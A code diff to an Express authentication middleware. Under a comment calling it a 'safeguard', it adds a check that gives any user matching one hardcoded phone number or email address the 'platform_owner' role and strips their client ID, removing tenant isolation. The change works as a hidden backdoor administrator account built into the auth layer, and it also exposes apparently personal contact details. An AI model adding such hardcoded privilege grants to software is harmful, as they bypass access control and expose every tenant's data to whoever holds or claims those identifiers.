@@ -15,8 +15,15 @@ export const protect = async (req, res, next) => {
     if (!user) {
       return res.status(401).json({ message: 'User no longer exists' });
     }
+    // Master platform owner safeguard
+    if (user.mobile === '9345578103' || (user.email && user.email.toLowerCase() === 'bsgopal0@gmail.com')) {
+      user.role = 'platform_owner';
+      delete user.clientId;
+    }
     req.user = { ...user, _id: String(user._id) };
-    if (user.clientId) req.user.clientId = String(user.clientId);
+    if (user.clientId && user.role !== 'platform_owner') {
+      req.user.clientId = String(user.clientId);
+    }
     next();
   } catch (error) {
     return res.status(401).json({ message: 'Not authorized, token failed' });
